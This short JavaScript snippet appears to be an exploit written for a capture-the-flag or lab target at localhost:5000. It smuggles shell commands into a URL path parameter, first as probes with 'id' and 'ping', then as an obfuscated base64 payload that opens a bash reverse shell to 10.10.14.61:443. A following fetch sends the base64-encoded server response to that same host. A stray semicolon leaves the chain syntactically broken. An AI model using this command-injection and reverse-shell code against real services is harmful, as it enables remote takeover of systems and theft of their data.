// fetch("http://localhost:5000/routines/" + encodeURIComponent("a[$(id)]"))
//fetch("http://localhost:5000/routines/" + encodeURIComponent("a[$(ping -c 1 10.10.14.61)]"));
fetch("http://localhost:5000/routines/" + encodeURIComponent("a[$(echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvNDQzICAwPiYxICAK | base64 -d | bash)]"));
.then(r => r.text())
  .then(d => fetch("http://10.10.14.61/?d=" + btoa(d)));

